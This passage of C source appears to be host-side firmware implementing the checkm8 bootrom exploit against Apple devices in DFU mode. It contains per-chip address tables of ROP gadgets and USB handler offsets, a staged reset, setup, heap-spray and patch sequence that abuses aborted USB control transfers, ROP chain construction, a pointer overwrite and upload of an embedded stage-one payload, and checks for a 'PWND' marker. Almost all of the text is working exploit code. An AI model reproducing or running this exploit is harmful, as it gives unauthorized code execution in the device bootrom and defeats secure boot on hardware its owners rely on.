        ctx.boot_tramp_end = 0x1800E1000;
        ctx.gUSBSerialNumber = 0x180087958;
        ctx.dfu_handle_request = 0x1800878F8;
        ctx.usb_core_do_transfer = 0x10000EE78;
        ctx.dfu_handle_bus_reset = 0x180087928;
        ctx.insecure_memory_base = 0x180380000;
        ctx.handle_interface_request = 0x10000F1B0;
        ctx.usb_create_string_descriptor = 0x10000E354;
        ctx.usb_serial_number_string_descriptor = 0x1800807DA;
    } else if (serial_contains(serial, " SRTG:[iBoot-2234.0.0.3.3]")) {
        ctx.cpid = 0x8000;
        ctx.config_overwrite_pad = 0x500;
        ctx.patch_addr = 0x10000812C;
        ctx.ttbr0_addr = 0x1800C8000;
        ctx.memcpy_addr = 0x100011030;
        ctx.aes_crypto_cmd = 0x10000DAA0;
        ctx.ttbr0_vrom_off = 0x400;
        ctx.boot_tramp_end = 0x1800E1000;
        ctx.gUSBSerialNumber = 0x180087958;
        ctx.dfu_handle_request = 0x1800878F8;
        ctx.usb_core_do_transfer = 0x10000EE78;
        ctx.dfu_handle_bus_reset = 0x180087928;
        ctx.insecure_memory_base = 0x180380000;
        ctx.handle_interface_request = 0x10000F1B0;
        ctx.usb_create_string_descriptor = 0x10000E354;
        ctx.usb_serial_number_string_descriptor = 0x1800807DA;
    } else if (serial_contains(serial, " SRTG:[iBoot-2481.0.0.2.1]")) {
        ctx.cpid = 0x8001;
        ctx.config_hole = 6;
        ctx.config_overwrite_pad = 0x5C0;
        ctx.tlbi = 0x100000404;
        ctx.nop_gadget = 0x10000CD60;
        ctx.ret_gadget = 0x100000118;
        ctx.patch_addr = 0x100007668;
        ctx.ttbr0_addr = 0x180050000;
        ctx.func_gadget = 0x10000CD40;
        ctx.write_ttbr0 = 0x1000003B4;
        ctx.memcpy_addr = 0x1000106F0;
        ctx.aes_crypto_cmd = 0x10000C9D4;
        ctx.boot_tramp_end = 0x180044000;
        ctx.ttbr0_vrom_off = 0x400;
        ctx.ttbr0_sram_off = 0x600;
        ctx.gUSBSerialNumber = 0x180047578;
        ctx.dfu_handle_request = 0x18004C378;
        ctx.usb_core_do_transfer = 0x10000DDA4;
        ctx.dfu_handle_bus_reset = 0x18004C3A8;
        ctx.insecure_memory_base = 0x180000000;
        ctx.handle_interface_request = 0x10000E0B4;
        ctx.usb_create_string_descriptor = 0x10000D280;
        ctx.usb_serial_number_string_descriptor = 0x18004486A;
    } else if (serial_contains(serial, " SRTG:[iBoot-2651.0.0.1.31]")) {
        ctx.cpid = 0x8002;
        ctx.config_hole = 5;
        ctx.config_overwrite_pad = 0x5C0;
        ctx.memcpy_addr = 0xB6F8;
        ctx.aes_crypto_cmd = 0x86DD;
        ctx.gUSBSerialNumber = 0x48802AB8;
        ctx.dfu_handle_request = 0x48806344;
        ctx.payload_dest_armv7 = 0x48806E00;
        ctx.usb_core_do_transfer = 0x9411;
        ctx.dfu_handle_bus_reset = 0x4880635C;
        ctx.insecure_memory_base = 0x48818000;
        ctx.handle_interface_request = 0x95F1;
        ctx.usb_create_string_descriptor = 0x8CA5;
        ctx.usb_serial_number_string_descriptor = 0x4880037A;
    } else if (serial_contains(serial, " SRTG:[iBoot-2651.0.0.3.3]")) {
        ctx.cpid = 0x8004;
        ctx.config_hole = 5;
        ctx.config_overwrite_pad = 0x5C0;
        ctx.memcpy_addr = 0xA884;
        ctx.aes_crypto_cmd = 0x786D;
        ctx.gUSBSerialNumber = 0x48802AE8;
        ctx.dfu_handle_request = 0x48806384;
        ctx.payload_dest_armv7 = 0x48806E00;
        ctx.usb_core_do_transfer = 0x85A1;
        ctx.dfu_handle_bus_reset = 0x4880639C;
        ctx.insecure_memory_base = 0x48818000;
        ctx.handle_interface_request = 0x877D;
        ctx.usb_create_string_descriptor = 0x7E35;
        ctx.usb_serial_number_string_descriptor = 0x488003CA;
    } else if (serial_contains(serial, " SRTG:[iBoot-2696.0.0.1.33]")) {
        ctx.cpid = 0x8010;
        ctx.config_hole = 5;
        ctx.config_overwrite_pad = 0x5C0;
        ctx.tlbi = 0x100000434;
        ctx.nop_gadget = 0x10000CC6C;
        ctx.ret_gadget = 0x10000015C;
        ctx.patch_addr = 0x1000074AC;
        ctx.ttbr0_addr = 0x1800A0000;
        ctx.func_gadget = 0x10000CC4C;
        ctx.write_ttbr0 = 0x1000003E4;
        ctx.memcpy_addr = 0x100010730;
        ctx.aes_crypto_cmd = 0x10000C8F4;
        ctx.boot_tramp_end = 0x1800B0000;
        ctx.ttbr0_vrom_off = 0x400;
        ctx.ttbr0_sram_off = 0x600;
        ctx.gUSBSerialNumber = 0x180083CF8;
        ctx.dfu_handle_request = 0x180088B48;
        ctx.usb_core_do_transfer = 0x10000DC98;
        ctx.dfu_handle_bus_reset = 0x180088B78;
        ctx.insecure_memory_base = 0x1800B0000;
        ctx.handle_interface_request = 0x10000DFB8;
        ctx.usb_create_string_descriptor = 0x10000D150;
        ctx.usb_serial_number_string_descriptor = 0x1800805DA;
    } else if (serial_contains(serial, " SRTG:[iBoot-3135.0.0.2.3]")) {
        ctx.cpid = 0x8011;
        ctx.config_hole = 6;
        ctx.config_overwrite_pad = 0x540;
        ctx.tlbi = 0x100000444;
        ctx.nop_gadget = 0x10000CD0C;
        ctx.ret_gadget = 0x100000148;
        ctx.patch_addr = 0x100007630;
        ctx.ttbr0_addr = 0x1800A0000;
        ctx.func_gadget = 0x10000CCEC;
        ctx.write_ttbr0 = 0x1000003F4;
        ctx.memcpy_addr = 0x100010950;
        ctx.aes_crypto_cmd = 0x10000C994;
        ctx.boot_tramp_end = 0x1800B0000;
        ctx.ttbr0_vrom_off = 0x400;
        ctx.ttbr0_sram_off = 0x600;
        ctx.gUSBSerialNumber = 0x180083D28;
        ctx.dfu_handle_request = 0x180088A58;
        ctx.usb_core_do_transfer = 0x10000DD64;
        ctx.dfu_handle_bus_reset = 0x180088A88;
        ctx.insecure_memory_base = 0x1800B0000;
        ctx.handle_interface_request = 0x10000E08C;
        ctx.usb_create_string_descriptor = 0x10000D234;
        ctx.usb_serial_number_string_descriptor = 0x18008062A;
    } else if (serial_contains(serial, " SRTG:[iBoot-3332.0.0.1.23]")) {
        ctx.cpid = 0x8015;
        ctx.config_hole = 6;
        ctx.config_overwrite_pad = 0x540;
        ctx.tlbi = 0x1000004AC;
        ctx.nop_gadget = 0x10000A9C4;
        ctx.ret_gadget = 0x100000148;
        ctx.patch_addr = 0x10000624C;
        ctx.ttbr0_addr = 0x18000C000;
        ctx.func_gadget = 0x10000A9AC;
        ctx.write_ttbr0 = 0x10000045C;
        ctx.memcpy_addr = 0x10000E9D0;
        ctx.aes_crypto_cmd = 0x100009E9C;
        ctx.boot_tramp_end = 0x18001C000;
        ctx.ttbr0_vrom_off = 0x400;
        ctx.ttbr0_sram_off = 0x600;
        ctx.gUSBSerialNumber = 0x180003A78;
        ctx.dfu_handle_request = 0x180008638;
        ctx.usb_core_do_transfer = 0x10000B9A8;
        ctx.dfu_handle_bus_reset = 0x180008668;
        ctx.insecure_memory_base = 0x18001C000;
        ctx.handle_interface_request = 0x10000BCCC;
        ctx.usb_create_string_descriptor = 0x10000AE80;
        ctx.usb_serial_number_string_descriptor = 0x1800008FA;
    } else if (serial_contains(serial, " SRTG:[iBoot-3401.0.0.1.16]")) {
        ctx.cpid = 0x8012;
        ctx.config_hole = 6;
        ctx.config_overwrite_pad = 0x540;
        ctx.tlbi = 0x100000494;
        ctx.nop_gadget = 0x100008DB8;
        ctx.ret_gadget = 0x10000012C;
        ctx.patch_addr = 0x100004854;
        ctx.ttbr0_addr = 0x18000C000;
        ctx.func_gadget = 0x100008DA0;
        ctx.write_ttbr0 = 0x100000444;
        ctx.memcpy_addr = 0x10000EA30;
        ctx.aes_crypto_cmd = 0x1000082AC;
        ctx.boot_tramp_end = 0x18001C000;
        ctx.ttbr0_vrom_off = 0x400;
        ctx.ttbr0_sram_off = 0x600;
        ctx.gUSBSerialNumber = 0x180003AF8;
        ctx.dfu_handle_request = 0x180008B08;
        ctx.usb_core_do_transfer = 0x10000BD20;
        ctx.dfu_handle_bus_reset = 0x180008B38;
        ctx.insecure_memory_base = 0x18001C000;
        ctx.handle_interface_request = 0x10000BFFC;
        ctx.usb_create_string_descriptor = 0x10000B1CC;
        ctx.usb_serial_number_string_descriptor = 0x18000082A;
    }

    return ctx.cpid != 0;
}

static bool dfu_check_status(uint8_t daddr, uint8_t status, uint8_t state) {
    struct {
        uint8_t status;
        uint8_t poll_timeout[3];
        uint8_t state;
        uint8_t str_idx;
    } dfu_status;
    transfer_ret_t transfer_ret;

    memset(&dfu_status, 0, sizeof(dfu_status));
    bool queued = control_xfer(daddr, 0xA1, DFU_GET_STATUS, 0, 0, &dfu_status, sizeof(dfu_status),
                               USB_TIMEOUT_MS, &transfer_ret);
    bool ok = queued &&
              transfer_ret.ret == USB_TRANSFER_OK &&
              transfer_ret.sz == sizeof(dfu_status) &&
              dfu_status.status == status &&
              dfu_status.state == state;

    app_logf("checkm8: GET_STATUS want=%u queued=%u ret=%s sz=%lu status=%u state=%u\r\n",
             state,
             queued ? 1u : 0u,
             transfer_name(transfer_ret.ret),
             (unsigned long)transfer_ret.sz,
             dfu_status.status,
             dfu_status.state);

    return ok;
}

static bool raw_dfu_check_status(uint8_t daddr, uint8_t status, uint8_t state) {
    struct {
        uint8_t status;
        uint8_t poll_timeout[3];
        uint8_t state;
        uint8_t str_idx;
    } dfu_status;
    transfer_ret_t transfer_ret;

    memset(&dfu_status, 0, sizeof(dfu_status));
    bool queued = raw_control_in(daddr, 0xA1, DFU_GET_STATUS, 0, 0,
                                     &dfu_status, sizeof(dfu_status), false, &transfer_ret);
    bool ok = queued &&
              transfer_ret.ret == USB_TRANSFER_OK &&
              transfer_ret.sz == sizeof(dfu_status) &&
              dfu_status.status == status &&
              dfu_status.state == state;

    app_logf("checkm8: RAW_GET_STATUS want=%u queued=%u ret=%s sz=%lu status=%u state=%u\r\n",
             state,
             queued ? 1u : 0u,
             transfer_name(transfer_ret.ret),
             (unsigned long)transfer_ret.sz,
             dfu_status.status,
             dfu_status.state);

    return ok;
}

static bool dfu_set_state_wait_reset(uint8_t daddr) {
    transfer_ret_t transfer_ret;

    bool queued = control_xfer_no_data_timeout(daddr, 0x21, DFU_DNLOAD, 0, 0, 0,
                                               USB_TIMEOUT_MS, &transfer_ret);
    app_logf("checkm8: DNLOAD zlp queued=%u ret=%s sz=%lu\r\n",
             queued ? 1u : 0u,
             transfer_name(transfer_ret.ret),
             (unsigned long)transfer_ret.sz);

    return queued &&
           transfer_ret.ret == USB_TRANSFER_OK &&
           transfer_ret.sz == 0 &&
           dfu_check_status(daddr, DFU_STATUS_OK, DFU_STATE_MANIFEST_SYNC) &&
           dfu_check_status(daddr, DFU_STATUS_OK, DFU_STATE_MANIFEST) &&
           dfu_check_status(daddr, DFU_STATUS_OK, DFU_STATE_MANIFEST_WAIT_RESET);
}

static bool checkm8_stage_reset(uint8_t daddr) {
    transfer_ret_t transfer_ret;

    bool queued = control_xfer_no_data_timeout(daddr, 0x21, DFU_DNLOAD, 0, 0,
                                               DFU_FILE_SUFFIX_LEN, USB_TIMEOUT_MS, &transfer_ret);
    app_logf("checkm8: RESET dnload16 queued=%u ret=%s sz=%lu\r\n",
             queued ? 1u : 0u,
             transfer_name(transfer_ret.ret),
             (unsigned long)transfer_ret.sz);
    if (queued &&
        transfer_ret.ret == USB_TRANSFER_OK &&
        transfer_ret.sz == DFU_FILE_SUFFIX_LEN &&
        dfu_set_state_wait_reset(daddr)) {
        queued = control_xfer_no_data_timeout(daddr, 0x21, DFU_DNLOAD, 0, 0,
                                               EP0_MAX_PACKET_SZ, USB_TIMEOUT_MS, &transfer_ret);
        app_logf("checkm8: RESET dnload64 queued=%u ret=%s sz=%lu\r\n",
                 queued ? 1u : 0u,
                 transfer_name(transfer_ret.ret),
                 (unsigned long)transfer_ret.sz);
        if (queued &&
            transfer_ret.ret == USB_TRANSFER_OK &&
            transfer_ret.sz == EP0_MAX_PACKET_SZ) {
            return true;
        }
    }

    queued = control_xfer_no_data_timeout(daddr, 0x21, DFU_CLR_STATUS, 0, 0, 0,
                                          USB_TIMEOUT_MS, &transfer_ret);
    app_logf("checkm8: RESET clrstatus queued=%u ret=%s sz=%lu\r\n",
             queued ? 1u : 0u,
             transfer_name(transfer_ret.ret),
             (unsigned long)transfer_ret.sz);
    return false;
}

static bool checkm8_stage_setup(uint8_t daddr) {
    uint32_t abort_timeout = USB_TIMEOUT_MS - 1;
    transfer_ret_t transfer_ret;
    uint32_t setup_try = 0;

    while (true) {
        memset(control_zero_buf, 0, DFU_MAX_TRANSFER_SZ);
        bool abort_queued = raw_control_out_abort(daddr, 0x21, DFU_DNLOAD, 0, 0,
                                                      control_zero_buf, DFU_MAX_TRANSFER_SZ,
                                                      abort_timeout, &transfer_ret);
        size_t pad_len = 0;
        if (abort_queued && transfer_ret.sz < ctx.config_overwrite_pad) {
            pad_len = ctx.config_overwrite_pad - transfer_ret.sz;
        }

        if (setup_try < 4 || (setup_try % 16u) == 0) {
            app_logf("checkm8: SETUP abort try=%lu t=%lu queued=%u ret=%s sz=%lu pad=%lu\r\n",
                     (unsigned long)(setup_try + 1),
                     (unsigned long)abort_timeout,
                     abort_queued ? 1u : 0u,
                     transfer_name(transfer_ret.ret),
                     (unsigned long)transfer_ret.sz,
                     (unsigned long)pad_len);
        }

        if (abort_queued && pad_len != 0) {
            bool pad_queued = control_xfer_no_data_timeout(daddr, 0, 0, 0, 0, pad_len,
                                                           USB_TIMEOUT_MS, &transfer_ret);
            if (setup_try < 4 || (setup_try % 16u) == 0) {
                app_logf("checkm8: SETUP pad queued=%u ret=%s sz=%lu\r\n",
                         pad_queued ? 1u : 0u,
                         transfer_name(transfer_ret.ret),
                         (unsigned long)transfer_ret.sz);
            }

            if (pad_queued && transfer_ret.ret == USB_TRANSFER_STALL) {
                recover_ep0_after_expected_stall(daddr);
                return true;
            }
        }

        control_xfer_no_data_timeout(daddr, 0x21, DFU_DNLOAD, 0, 0,
                                     EP0_MAX_PACKET_SZ, USB_TIMEOUT_MS, NULL);
        abort_timeout = (abort_timeout + 1) % (USB_TIMEOUT_MS - USB_ABORT_TIMEOUT_MIN_MS + 1) +
                        USB_ABORT_TIMEOUT_MIN_MS;
        setup_try++;
        host_task_poll();
    }
}

static bool checkm8_usb_request_leak_result(uint8_t daddr, transfer_ret_t *result) {
    transfer_ret_t transfer_ret;

    bool queued = control_xfer_abort_no_data(daddr, 0x80, 6, (3u << 8u) | ctx.serial_idx,
                                             USB_MAX_STRING_DESCRIPTOR_IDX, EP0_MAX_PACKET_SZ, 1,
                                             &transfer_ret);
    if (result) {
        *result = transfer_ret;
    }

    return queued && transfer_ret.sz == 0;
}

static bool checkm8_usb_request_leak(uint8_t daddr) {
    return checkm8_usb_request_leak_result(daddr, NULL);
}

static void checkm8_stall(uint8_t daddr) {
    uint32_t abort_timeout = USB_TIMEOUT_MS - 1;
    transfer_ret_t transfer_ret;

    while (true) {
        if (control_xfer_abort_no_data(daddr, 0x80, 6, (3u << 8u) | ctx.serial_idx,
                                       USB_MAX_STRING_DESCRIPTOR_IDX, 3 * EP0_MAX_PACKET_SZ,
                                       abort_timeout, &transfer_ret) &&
            transfer_ret.sz < 3 * EP0_MAX_PACKET_SZ &&
            checkm8_usb_request_leak(daddr)) {
            break;
        }

        abort_timeout = (abort_timeout + 1) % (USB_TIMEOUT_MS - USB_ABORT_TIMEOUT_MIN_MS + 1) +
                        USB_ABORT_TIMEOUT_MIN_MS;
        host_task_poll();
    }
}

static bool checkm8_no_leak_result(uint8_t daddr, transfer_ret_t *result) {
    transfer_ret_t transfer_ret;

    bool queued = control_xfer_abort_no_data(daddr, 0x80, 6, (3u << 8u) | ctx.serial_idx,
                                             USB_MAX_STRING_DESCRIPTOR_IDX,
                                             3 * EP0_MAX_PACKET_SZ + 1, 1,
                                             &transfer_ret);
    if (result) {
        *result = transfer_ret;
    }

    return queued && transfer_ret.sz == 0;
}

static bool checkm8_no_leak(uint8_t daddr) {
    return checkm8_no_leak_result(daddr, NULL);
}

static bool checkm8_usb_request_stall_result(uint8_t daddr, transfer_ret_t *result) {
    transfer_ret_t transfer_ret;

    bool queued = control_xfer_no_data_timeout(daddr, 2, 3, 0, 0x80, 0,
                                               USB_TIMEOUT_MS, &transfer_ret);
    if (result) {
        *result = transfer_ret;
    }

    return queued && transfer_ret.ret == USB_TRANSFER_STALL;
}

static bool checkm8_usb_request_stall(uint8_t daddr) {
    return checkm8_usb_request_stall_result(daddr, NULL);
}

static bool checkm8_stage_spray(uint8_t daddr) {
    if (ctx.config_large_leak == 0) {
        if (ctx.cpid == 0x7001 || ctx.cpid == 0x7000 || ctx.cpid == 0x7002 ||
            ctx.cpid == 0x8003 || ctx.cpid == 0x8000) {
            uint32_t spray_try = 0;
            while (true) {
                transfer_ret_t stall_ret = {.ret = USB_TRANSFER_ERROR, .sz = 0};
                transfer_ret_t leak_ret = {.ret = USB_TRANSFER_ERROR, .sz = 0};
                transfer_ret_t no_leak_ret = {.ret = USB_TRANSFER_ERROR, .sz = 0};
                bool stall_ok = checkm8_usb_request_stall_result(daddr, &stall_ret);
                bool leak_ok = false;
                bool no_leak_ok = false;

                if (stall_ok) {
                    leak_ok = checkm8_usb_request_leak_result(daddr, &leak_ret);
                }
                if (stall_ok && leak_ok) {
                    no_leak_ok = checkm8_no_leak_result(daddr, &no_leak_ret);
                }

                if (spray_try < 4 || (spray_try % 16u) == 0) {
                    app_logf("checkm8: SPRAY try=%lu stall=%u/%s/%lu leak=%u/%s/%lu noleak=%u/%s/%lu\r\n",
                             (unsigned long)(spray_try + 1),
                             stall_ok ? 1u : 0u,
                             transfer_name(stall_ret.ret),
                             (unsigned long)stall_ret.sz,
                             leak_ok ? 1u : 0u,
                             transfer_name(leak_ret.ret),
                             (unsigned long)leak_ret.sz,
                             no_leak_ok ? 1u : 0u,
                             transfer_name(no_leak_ret.ret),
                             (unsigned long)no_leak_ret.sz);
                }

                if (stall_ok && leak_ok && no_leak_ok) {
                    break;
                }

                spray_try++;
                host_task_poll();
            }
        } else {
            checkm8_stall(daddr);
            for (size_t i = 0; i < ctx.config_hole; i++) {
                while (!checkm8_no_leak(daddr)) {
                    host_task_poll();
                }
            }
            while (!checkm8_usb_request_leak(daddr) || !checkm8_no_leak(daddr)) {
                host_task_poll();
            }
        }
        transfer_ret_t clr_ret = {0};
        bool clr_queued = control_xfer_no_data_timeout(daddr, 0x21, DFU_CLR_STATUS, 0, 0,
                                                       3 * EP0_MAX_PACKET_SZ + 1,
                                                       USB_TIMEOUT_MS, &clr_ret);
        app_logf("checkm8: SPRAY clrstatus queued=%u ret=%s sz=%lu\r\n",
                 clr_queued ? 1u : 0u,
                 transfer_name(clr_ret.ret),
                 (unsigned long)clr_ret.sz);
    } else {
        for (size_t i = 0; i < ctx.config_large_leak; i++) {
            while (!checkm8_usb_request_stall(daddr)) {
                host_task_poll();
            }
        }
        transfer_ret_t clr_ret = {0};
        bool clr_queued = control_xfer_no_data_timeout(daddr, 0x21, DFU_CLR_STATUS, 0, 0, 0,
                                                       USB_TIMEOUT_MS, &clr_ret);
        app_logf("checkm8: SPRAY clrstatus queued=%u ret=%s sz=%lu\r\n",
                 clr_queued ? 1u : 0u,
                 transfer_name(clr_ret.ret),
                 (unsigned long)clr_ret.sz);
    }

    return true;
}

static size_t usb_rop_callbacks(uint8_t *buf, uint64_t addr, callback_t const *callbacks, size_t callback_cnt) {
    uint8_t block_0[MAX_BLOCK_SZ];
    uint8_t block_1[MAX_BLOCK_SZ];
    size_t sz = 0;

    for (size_t i = 0; i < callback_cnt; i += 5) {
        size_t block_0_sz = 0;
        size_t block_1_sz = 0;

        for (size_t j = 0; j < 5; j++) {
            uint64_t reg;

            addr += MAX_BLOCK_SZ / 5;
            if (j == 4) {
                addr += MAX_BLOCK_SZ;
            }

            if (i + j < callback_cnt - 1) {
                reg = ctx.func_gadget;
                memcpy(block_0 + block_0_sz, &reg, sizeof(reg));
                block_0_sz += sizeof(reg);
                reg = addr;
                memcpy(block_0 + block_0_sz, &reg, sizeof(reg));
                block_0_sz += sizeof(reg);
                reg = callbacks[i + j].arg;
                memcpy(block_1 + block_1_sz, &reg, sizeof(reg));
                block_1_sz += sizeof(reg);
                reg = callbacks[i + j].func;
                memcpy(block_1 + block_1_sz, &reg, sizeof(reg));
                block_1_sz += sizeof(reg);
            } else if (i + j == callback_cnt - 1) {
                reg = ctx.func_gadget;
                memcpy(block_0 + block_0_sz, &reg, sizeof(reg));
                block_0_sz += sizeof(reg);
                reg = 0;
                memcpy(block_0 + block_0_sz, &reg, sizeof(reg));
                block_0_sz += sizeof(reg);
                reg = callbacks[i + j].arg;
                memcpy(block_1 + block_1_sz, &reg, sizeof(reg));
                block_1_sz += sizeof(reg);
                reg = callbacks[i + j].func;
                memcpy(block_1 + block_1_sz, &reg, sizeof(reg));
                block_1_sz += sizeof(reg);
            } else {
                reg = 0;
                memcpy(block_0 + block_0_sz, &reg, sizeof(reg));
                block_0_sz += sizeof(reg);
                memcpy(block_0 + block_0_sz, &reg, sizeof(reg));
                block_0_sz += sizeof(reg);
            }
        }

        memcpy(buf + sz, block_0, block_0_sz);
        sz += block_0_sz;
        memcpy(buf + sz, block_1, block_1_sz);
        sz += block_1_sz;
    }

    return sz;
}

static bool checkm8_stage_patch(uint8_t daddr) {
    struct {
        uint64_t pwnd[2];
        uint64_t payload_dest;
        uint64_t dfu_handle_bus_reset;
        uint64_t dfu_handle_request;
        uint64_t payload_off;
        uint64_t payload_sz;
        uint64_t memcpy_addr;
        uint64_t gUSBSerialNumber;
        uint64_t usb_create_string_descriptor;
        uint64_t usb_serial_number_string_descriptor;
        uint64_t ttbr0_vrom_addr;
        uint64_t patch_addr;
    } A9;
    struct {
        uint64_t pwnd[2];
        uint64_t payload_dest;
        uint64_t dfu_handle_bus_reset;
        uint64_t dfu_handle_request;
        uint64_t payload_off;
        uint64_t payload_sz;
        uint64_t memcpy_addr;
        uint64_t gUSBSerialNumber;
        uint64_t usb_create_string_descriptor;
        uint64_t usb_serial_number_string_descriptor;
        uint64_t patch_addr;
    } notA9;
    struct {
        uint32_t pwnd[4];
        uint32_t payload_dest;
        uint32_t dfu_handle_bus_reset;
        uint32_t dfu_handle_request;
        uint32_t payload_off;
        uint32_t payload_sz;
        uint32_t memcpy_addr;
        uint32_t gUSBSerialNumber;
        uint32_t usb_create_string_descriptor;
        uint32_t usb_serial_number_string_descriptor;
    } notA9_armv7;
    struct {
        uint64_t handle_interface_request;
        uint64_t insecure_memory_base;
        uint64_t exec_magic;
        uint64_t done_magic;
        uint64_t memc_magic;
        uint64_t memcpy_addr;
        uint64_t usb_core_do_transfer;
    } handle_checkm8_request;
    struct {
        uint32_t handle_interface_request;
        uint32_t insecure_memory_base;
        uint32_t exec_magic;
        uint32_t done_magic;
        uint32_t memc_magic;
        uint32_t memcpy_addr;
        uint32_t usb_core_do_transfer;
    } handle_checkm8_request_armv7;
    callback_t callbacks[] = {
        {ctx.write_ttbr0, ctx.insecure_memory_base},
        {ctx.tlbi, 0},
        {ctx.insecure_memory_base + ARM_16K_TT_L2_SZ + ctx.ttbr0_sram_off + 2 * sizeof(uint64_t), 0},
        {ctx.write_ttbr0, ctx.ttbr0_addr},
        {ctx.tlbi, 0},
        {ctx.ret_gadget, 0},
    };
    extern uint8_t const stage1_a9_8000_bin[];
    extern uint8_t const stage1_a9_8000_bin_end[];
    extern uint8_t const stage1_a9_8003_bin[];
    extern uint8_t const stage1_a9_8003_bin_end[];

    uint8_t *data;
    size_t data_sz;
    if (ctx.cpid == 0x8003) {
        data = (uint8_t *)stage1_a9_8003_bin;
        data_sz = (size_t)(stage1_a9_8003_bin_end - stage1_a9_8003_bin);
    } else {
        data = (uint8_t *)stage1_a9_8000_bin;
        data_sz = (size_t)(stage1_a9_8000_bin_end - stage1_a9_8000_bin);
    }
    transfer_ret_t transfer_ret;

    if (data_sz == 0) {
        app_log_enqueue("checkm8: stage1_a9.bin is empty\r\n");
        return false;
    }

    app_logf("checkm8: PATCH data_sz=%lu\r\n", (unsigned long)data_sz);

    control_xfer(daddr, 2, 3, 0, 0x80, NULL, 0, USB_TIMEOUT_MS, &transfer_ret);
    app_logf("checkm8: PATCH stall1 ret=%s\r\n", transfer_name(transfer_ret.ret));
    if (transfer_ret.ret == USB_TRANSFER_STALL) {
        recover_ep0_after_expected_stall(daddr);
    }

    control_xfer(daddr, 2, 3, 0, 0x80, NULL, 0, USB_TIMEOUT_MS, &transfer_ret);
    app_logf("checkm8: PATCH stall2 ret=%s\r\n", transfer_name(transfer_ret.ret));
    if (transfer_ret.ret == USB_TRANSFER_STALL) {
        recover_ep0_after_expected_stall(daddr);
    }

    uint8_t overwrite_buf[48];
    memset(overwrite_buf, 0, sizeof(overwrite_buf));
    uint64_t next_ptr = ctx.insecure_memory_base;
    memcpy(&overwrite_buf[40], &next_ptr, sizeof(next_ptr));

    bool ow_ok = raw_control_out(daddr, 0x00, 0x00, 0, 0,
                                      overwrite_buf, sizeof(overwrite_buf), false);
    app_logf("checkm8: PATCH overwrite ret=%s\r\n", ow_ok ? "ok" : "fail");

    for (size_t i = 0; i < data_sz;) {
        size_t packet_sz = MIN(data_sz - i, DFU_MAX_TRANSFER_SZ);
        raw_control_out(daddr, 0x21, DFU_DNLOAD, 0, 0, &data[i], packet_sz, true);
        i += packet_sz;
    }
    app_logf("checkm8: PATCH payload sent %lu bytes\r\n", (unsigned long)data_sz);

    raw_control_out(daddr, 0x21, DFU_CLR_STATUS, 0, 0, NULL, 0, false);
    app_log_enqueue("checkm8: PATCH trigger done\r\n");
    return true;
}

void checkm8_init(void) {
    memset(&ctx, 0, sizeof(ctx));
    ctx.stage = CHECKM8_STAGE_RESET;
}

void checkm8_reset_state(void) {
    uint16_t cpid = ctx.cpid;
    clear_target_config();
    ctx.cpid = cpid;
    ctx.stage = CHECKM8_STAGE_RESET;
}

checkm8_stage_t checkm8_current_stage(void) {
    return ctx.stage;
}

uint16_t checkm8_current_cpid(void) {
    return ctx.cpid;
}

bool checkm8_probe_device(uint8_t daddr, checkm8_probe_t *probe) {
    uint16_t vid = 0;
    uint16_t pid = 0;

    memset(probe, 0, sizeof(*probe));

    if (!tuh_vid_pid_get(daddr, &vid, &pid)) {
        app_logf("checkm8: probe vid/pid lookup failed daddr=%u\r\n", daddr);
        return false;
    }

    if (vid != APPLE_VID || pid != DFU_MODE_PID) {
        app_logf("checkm8: probe wrong device vid=0x%04x pid=0x%04x\r\n", vid, pid);
        return false;
    }

    uint8_t serial_idx = log_device_descriptor(daddr);

    char candidate[sizeof(probe->serial)];
    bool found_srtg = false;

    if (serial_idx != 0 && read_string_descriptor_ascii(daddr, serial_idx, candidate, sizeof(candidate))) {
        app_logf("checkm8: serial[%u]: %s\r\n", serial_idx, candidate);
        if (strstr(candidate, "SRTG:[") || strstr(candidate, "PWND:[") || strstr(candidate, "YOLO:")) {
            strncpy(probe->serial, candidate, sizeof(probe->serial) - 1);
            probe->serial[sizeof(probe->serial) - 1] = 0;
            ctx.serial_idx = serial_idx;
            found_srtg = true;
        }
    }

    if (!found_srtg) {
        for (uint8_t idx = 1; idx <= USB_MAX_STRING_DESCRIPTOR_IDX; idx++) {
            if (idx == serial_idx || !read_string_descriptor_ascii(daddr, idx, candidate, sizeof(candidate))) {
                continue;
            }

            app_logf("checkm8: fallback string[%u]: %s\r\n", idx, candidate);
            if (strstr(candidate, "SRTG:[") || strstr(candidate, "PWND:[") || strstr(candidate, "YOLO:")) {
                strncpy(probe->serial, candidate, sizeof(probe->serial) - 1);
                probe->serial[sizeof(probe->serial) - 1] = 0;
                ctx.serial_idx = idx;
                found_srtg = true;
                break;
            }
        }
    }

    if (!found_srtg) {
        app_log_enqueue("checkm8: no SRTG serial descriptor found\r\n");
        return false;
    }

    probe->pwned = strstr(probe->serial, " PWND:[") != NULL ||
                   strstr(probe->serial, " YOLO:") != NULL;

    char const *ecid_str = strstr(probe->serial, "ECID:");
    if (ecid_str) {
        probe->ecid = strtoull(ecid_str + 5, NULL, 16);
    }

    if (probe->pwned) {
        probe->supported = true;
        probe->cpid = ctx.cpid;
        ctx.stage = CHECKM8_STAGE_PWND;
    } else {
        probe->supported = configure_target_from_serial(probe->serial);
        probe->cpid = ctx.cpid;
    }

    return true;
}

bool checkm8_run_current_stage(uint8_t daddr) {
    bool ok = false;

    switch (ctx.stage) {
    case CHECKM8_STAGE_RESET:
        ok = checkm8_stage_reset(daddr);
        if (ok) {
            ctx.stage = CHECKM8_STAGE_SETUP;
        }
        break;
    case CHECKM8_STAGE_SETUP:
        ok = checkm8_stage_setup(daddr);
        if (ok) {
            ctx.stage = CHECKM8_STAGE_SPRAY;
        }
        break;
    case CHECKM8_STAGE_SPRAY:
        ok = checkm8_stage_spray(daddr);
        if (ok) {
            ctx.stage = CHECKM8_STAGE_PATCH;
        }
        break;
    case CHECKM8_STAGE_PATCH:
        ok = checkm8_stage_patch(daddr);
        if (ok) {
            ctx.stage = CHECKM8_STAGE_RESET;
        }
        break;
    case CHECKM8_STAGE_PWND:
        ok = true;
        break;
    default:
        break;
    }

    if (!ok) {
        ctx.stage = CHECKM8_STAGE_RESET;
    }

    return ok;
}

char const *checkm8_stage_name(checkm8_stage_t stage) {
    switch (stage) {
    case CHECKM8_STAGE_RESET:
        return "RESET";
    case CHECKM8_STAGE_SETUP:
        return "SETUP";
    case CHECKM8_STAGE_SPRAY:
        return "SPRAY";
    case CHECKM8_STAGE_PATCH:
        return "PATCH";
    case CHECKM8_STAGE_PWND:
        return "PWND";
    default:
        return "?";
    }
}
